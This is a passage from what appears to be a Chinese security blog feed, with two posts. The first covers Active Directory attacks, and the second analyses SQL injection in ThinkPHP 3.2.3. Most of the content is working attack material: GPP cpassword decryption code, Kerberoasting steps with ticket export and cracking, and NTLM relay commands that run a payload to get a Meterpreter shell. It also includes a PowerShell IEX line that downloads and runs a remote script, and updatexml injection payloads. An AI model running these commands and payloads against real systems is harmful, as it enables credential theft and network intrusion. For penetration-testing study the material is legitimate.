punctuation">,</span>0x6c<span class="token punctuation">,</span>0x1b<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#Set IV to all nulls to prevent dynamic generation of IV value</span>        <span class="token variable">$AesIV</span> = <span class="token function">New-Object</span> Byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$AesObject</span><span class="token punctuation">.</span>IV<span class="token punctuation">.</span>Length<span class="token punctuation">)</span>         <span class="token variable">$AesObject</span><span class="token punctuation">.</span>IV = <span class="token variable">$AesIV</span>        <span class="token variable">$AesObject</span><span class="token punctuation">.</span>Key = <span class="token variable">$AesKey</span>        <span class="token variable">$DecryptorObject</span> = <span class="token variable">$AesObject</span><span class="token punctuation">.</span>CreateDecryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token namespace">[Byte[]</span><span class="token punctuation">]</span> <span class="token variable">$OutBlock</span> = <span class="token variable">$DecryptorObject</span><span class="token punctuation">.</span>TransformFinalBlock<span class="token punctuation">(</span><span class="token variable">$Base64Decoded</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$Base64Decoded</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token namespace">[System.Text.UnicodeEncoding]</span>::Unicode<span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token variable">$OutBlock</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">catch</span> <span class="token punctuation">{</span><span class="token function">Write-Error</span> <span class="token variable">$Error</span><span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>Get<span class="token operator">-</span>DecryptedCpassword <span class="token string">"I0vK3Yj0SeoHQDxF5skcjt3BOkMZmX6IiqRVKCTo4Z4"</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/1.png" alt="" loading="lazy"></p><p>针对SYSOVL的防御：</p><pre><code>1.打补丁KB29624862.删除SYSVOL目录下的groups.xml3.设置共享文件SYSVOL的权限</code></pre><h4 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a><strong>Kerberoasting</strong></h4><p>SPN为服务主体名称，是服务实列(MSSQL,HTTP等)的唯一标识，如果在林中安装服务的多个实列，每个实列都有自己的SPN，如果kerberos服务票证的加密类型为RC4_HMAC_MD5，就可以导出TGS对其进行离线破解，获取到域用户的密码了。</p><p>使用setspn查询spn(windows7和server2008默认自带)</p><p>查询域内所有的SPN和查询test域的SPN</p><pre><code>setspn.exe -q */*setspn.exe -T test.com -q */*</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/2.png" alt="" loading="lazy"></p><p>以CN开头的为代表一个账号，机器账号为Computers，域用户账号为Users</p><p>查询域内注册的spn（kerberoast）</p><pre><code>cscript GetUserSPNs.vbs</code></pre><p>PowerView</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><pre><code>Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon</code></pre><p>给MSSQL服务注册SPN</p><pre><code>setspn.exe -A MSSQLSvc/WIN-M34UCFJIPNQ.test.com test.com\fanxing</code></pre><p>将kerberos的加密方式换成RC4_HMAC_MD5</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/3.png" alt="" loading="lazy"></p><p>请求指定的TGS，完成之后klist就能查看相应的票据</p><pre><code>$SPNName = &#39;MSSQLSvc/WIN-M34UCFJIPNQ.test.com&#39;Add-Type -AssemblyNAme System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/4.png" alt="" loading="lazy"></p><p>mimikatz导出票据</p><pre><code>kerberos::list /export</code></pre><p>使用<a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">tgsrepcrack.py</a>破解</p><pre><code>python tgsrepcrack.py wordlist.txt mssql.kirbi</code></pre><p><strong>kerberoasting后门利用</strong></p><p>在获取到spn的修改权限后，可以给指定的域用户注册spn，可以获取到任意域用户的TGS进行离线破解</p><pre><code>setspn.exe -U -A VNC/WIN-M34UCFJIPNQ.test.com Administrator</code></pre><h4 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a><strong>重放攻击</strong></h4><p>在NTML认证的过程中，数据包传递的是NTML-Hash加密的16位的challenge随机数得到的Net-NTML</p><p> Hash，如果存在中间人的情况，就可以通过hash进行重放攻击，下面简述下存在中间人，NTML协议过程：</p><p><img src="https://p1.ssl.qhimg.com/t01f22f78b71df16680.png" alt="" loading="lazy"></p><pre><code>1.当客户端对服务端发起请求，客户端并不知道中间人存在，所以把请求发送给了中间人。中间人拿着这个请求发送给服务端，服务端以为是客户端发来的请求。2.进过验证后，会生成一个随机数(challenge)返回给攻击者，服务端保存的ntmlhash进行DES加密challenge(challenge1)，攻击者拿着这个challenge明文发送给客户端。3.客户端对这个challenge用自己的密码进行DES加密(response)，发送给中间人，中间人在将这个请求发送给服务端。4.服务端拿到这个response跟之前加密的challenge1进行对比，一样的话就验证成功。</code></pre><p>在进行ntml中间人攻击的时候，要避免最小的网络流量，所以使用的比较多的也是LLMNR/NetNS欺骗。</p><p>在两台windows进行进行资源请求的时候，对机器的解析顺序为：</p><pre><code>1.HOSTS文件(c:/windows/system32/driver/etc/hosts)2.本地的DNS缓存(ipconfig /displaydns)3.dns服务器4.LLMNR5.NetBios-NS</code></pre><h5 id="SMB中继"><a href="#SMB中继" class="headerlink" title="SMB中继"></a>SMB中继</h5><p>对于smb中继的利用条件：</p><pre><code>1.不能开启smb签名，而在域内，域控上面是开启了签名的，域成员机器是没有开启的。2.打了ms08-068补丁的xp/2003系统也无法利用</code></pre><p>首先利用nmap探测是否开启了签名</p><pre><code>nmap -sT -p 445 --open --script smb-security-mode,smb-os-discovery 192.168.50.241</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/5.png" alt="" loading="lazy"></p><h5 id="Responder-ntmlrelayx"><a href="#Responder-ntmlrelayx" class="headerlink" title="Responder+ntmlrelayx"></a>Responder+ntmlrelayx</h5><p>获取ntmlv2 hash，在攻击机执行</p><pre><code>python Responder.py -I eth0 -v      #假设ip为192.168.50.64</code></pre><p>在任意机器上执行</p><pre><code>dir \\192.168.50.64\c$</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/6.png" alt="" loading="lazy"></p><p>当使用ntmlrelayx进行重放攻击的时候，需要在Responder.conf设置SMB和HTTP服务为Off</p><pre><code>python Responder.py -I eth0 -v    # 启动Responder，假设ip为192.168.50.64python ntlmrelayx.py -t 192.168.50.241   # -t为受害者，进行中继攻击net use192.168.50.64\c$ &quot;fx@123.com&quot; /user:&quot;administrator&quot;   # 攻击机执行</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/7.png" alt="" loading="lazy"></p><h5 id="smbrelayx"><a href="#smbrelayx" class="headerlink" title="smbrelayx"></a>smbrelayx</h5><p>使用smbrelayx和ntmlrelayx都是利用的<a href="https://github.com/CoreSecurity/impacket.git" target="_blank" rel="noopener">impacket</a>，环境配置</p><pre><code>pip install pycrypto    # 安装加密库apt-get --reinstall install python-pyasn1 python-pyasn1-modulescd impacket/python setup.py install</code></pre><p>在攻击机进行重放攻击</p><pre><code># -h为指定受害者，-e在进行重放攻击后，在受害者机器执行exepython smbrelayx.py -h 192.168.50.241 -e /root/shell.exe </code></pre><p>在内网其他目标机器执行</p><pre><code>net use192.168.50.64\c$ &quot;fx@123.com&quot; /user:&quot;administrator&quot;</code></pre><p>在msf上成功获取到meterpreter</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/8.png" alt="" loading="lazy"></p><h5 id="Windows平台的重放攻击"><a href="#Windows平台的重放攻击" class="headerlink" title="Windows平台的重放攻击"></a>Windows平台的重放攻击</h5><p>在windows下，可以利用powershell编写的<a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">Inveigh</a>工具</p><pre><code>powershell &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1&#39;);Invoke-Inveigh -consoleoutput Y FileOutput Y&quot;</code></pre><p>在其他主机上执行</p><pre><code>dir \\192.168.50.242\c$   或者在开启HTTP，利用&lt;img&gt;来加载图片&lt;img src=&quot;\\192.168.50.242\1.png&quot;&gt;    在通过HTTP协议访问就行了</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/9.png" alt="" loading="lazy"></p><p>注意：在获取权限的那台机器，需要关闭windows防火墙，不是一直获取到challenge。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;高权限读取本地密码&quot;&gt;&lt;a href=&quot;#高权限读取本地密码&quot; class=&quot;headerlink&quot; title=&quot;高权限读取本地密码&quot;&gt;&lt;/a&gt;&lt;strong&gt;高权限读取本地密码&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;当域管理员在域成员机器上登录进行工作的时候，会将明
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP3.2.3 漏洞分析</title>
    <link href="http://yoursite.com/2020/02/24/ThinkPHP3.2.3%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/02/24/ThinkPHP3.2.3%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-02-23T16:00:00.000Z</published>
    <updated>2020-04-29T05:17:44.842Z</updated>
    
    <content type="html"><![CDATA[<h4 id="where注入"><a href="#where注入" class="headerlink" title="where注入"></a><strong>where注入</strong></h4><p>在控制器中，写个demo，利用字符串方式作为where传参时存在注入</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string">'id='</span><span class="token punctuation">.</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在变量user地方进行断点，PHPSTROM F7进入，I方法获取传入的参数</p><pre class=" language-php"><code class="language-php"><span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'get'</span>     <span class="token punctuation">:</span>               <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'post'</span>    <span class="token punctuation">:</span>               <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'put'</span>     <span class="token punctuation">:</span>               <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$_PUT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'), $_PUT);</span>            <span class="token punctuation">}</span>            <span class="token variable">$input</span>     <span class="token operator">=</span>    <span class="token variable">$_PUT</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'param'</span>   <span class="token punctuation">:</span>            <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>                    <span class="token variable">$input</span>  <span class="token operator">=</span>  <span class="token variable">$_POST</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'PUT'</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$_PUT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'), $_PUT);</span>                    <span class="token punctuation">}</span>                    <span class="token variable">$input</span>     <span class="token operator">=</span>    <span class="token variable">$_PUT</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">default</span><span class="token punctuation">:</span>                    <span class="token variable">$input</span>  <span class="token operator">=</span>  <span class="token variable">$_GET</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>重点看过滤函数</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/1.jpg" alt="" loading="lazy"></p><p>先利用htmlspecialchars函数过滤参数，在402行利用think_filter函数过滤常规sql函数</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">think_filter</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// TODO 其他安全过滤</span>    <span class="token comment" spellcheck="true">// 过滤查询特殊字符</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$value</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>在where方法中，将$where的值放入到options[“where”]数组中</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/2.png" alt="" loading="lazy"></p><p>继续跟进查看find方法，第748行</p><pre class=" language-php"><code class="language-php"><span class="token variable">$options</span>     <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_parseOptions</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在数组$options中增加’table’=&gt;’tp_user’，’model’=&gt;’User’，随后F7跟进select方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span>  <span class="token operator">=</span>   <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'model'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseBind</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span>    <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildSelectSql</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span>   <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'fetch_sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进buildSelectSql方法，继续在跟进parseSql方法，这里可以看到生成完整的sql语句</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/3.png" alt="" loading="lazy"></p><p>这里主要查看parseWhere方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/4.png" alt="" loading="lazy"></p><p>跟进parseThinkWhere方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseThinkWhere</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$whereStr</span>   <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">'_string'</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true">// 字符串模式查询条件</span>                <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token variable">$val</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'_complex'</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true">// 复合查询条件</span>                <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span></code></pre><p>$key为_string，所以$whereStr为传入的参数的值，最后parserWhere方法返回(id=1p)，所以最终payload为</p><pre><code>1) and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)--+</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/5.png" alt="" loading="lazy"></p><h4 id="exp注入"><a href="#exp注入" class="headerlink" title="exp注入"></a><strong>exp注入</strong></h4><p>漏洞demo，这里使用全局数组进行传参(不要用I方法)，漏洞才能生效</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$User</span> <span class="token operator">=</span> <span class="token function">D</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$map</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'id'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$User</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$map</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>直接在$user进行断点，F7跟进，跳过where方法，跟进find-&gt;select-&gt;buildSelectSql-&gt;parseSql-&gt;parseWhere</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/1.png" alt="" loading="lazy"></p><p>跟进parseWhereItem方法，此时参数$val为一个数组，{‘exp’,’sql注入exp’}</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/2.png" alt="" loading="lazy"></p><p>此时当$exp满足exp时，将参数和值就行拼接，所以最终paylaod为</p><pre><code>id[0]=exp&amp;id[1]==1 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))--+</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/3.png" alt="" loading="lazy"></p><p>上面至于为什么不能用I方法，原因是在过滤函数think_filter中能匹配到exp字符，所以在exp字符后面加了一个空格，导致在parseWhereItem方法中无法等于exp。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="bind注入"><a href="#bind注入" class="headerlink" title="bind注入"></a><strong>bind注入</strong></h4><p>漏洞demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$uname</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$uname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>F8跟进save方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/4.png" alt="" loading="lazy"></p><p>生成sql语句在update方法中</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$options</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span>  <span class="token operator">=</span>   <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'model'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseBind</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$table</span>  <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseTable</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'table'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span>   <span class="token operator">=</span> <span class="token string">'UPDATE '</span> <span class="token punctuation">.</span> <span class="token variable">$table</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseSet</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 多表更新支持JOIN操作</span>            <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseJoin</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//  单表更新支持order和lmit</span>            <span class="token variable">$sql</span>   <span class="token punctuation">.</span><span class="token operator">=</span>  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseOrder</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseLimit</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token 